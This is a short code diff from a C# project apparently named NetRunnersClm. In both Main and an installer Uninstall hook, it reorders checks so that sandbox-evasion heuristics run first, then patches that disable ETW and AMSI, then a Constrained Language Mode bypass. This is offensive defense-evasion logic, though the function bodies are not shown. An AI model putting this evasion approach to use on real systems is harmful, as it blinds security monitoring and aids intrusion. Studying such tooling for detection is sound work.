@@ -15,12 +15,14 @@ namespace NetRunnersClm
         static void Main(string[] args)
         {
             // call heuristic functions
-            if ((Sleep()) || (NonEmulated()))
+            if ((!Sleep()) || (!NonEmulated()))
             {
                 return;
             }
-            patchAmsi();
-            Bypass();
+            // call patchers
+            if ((!PatchEtw()) || (!PatchAmsi()))
+                return;
+            BypassClm();
         }
     }
     /// <summary>
@@ -32,14 +34,14 @@ namespace NetRunnersClm
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
             // call heuristic functions
-            if ((Sleep()) || (NonEmulated()))
+            if ((!Sleep()) || (!NonEmulated()))
             {
                 return;
             }
-            patchAmsi();
-            Bypass();
+            // call patchers
+            if ((!PatchEtw()) || (!PatchAmsi()))
+                return;
+            BypassClm();
         }
     }
 }
-
-
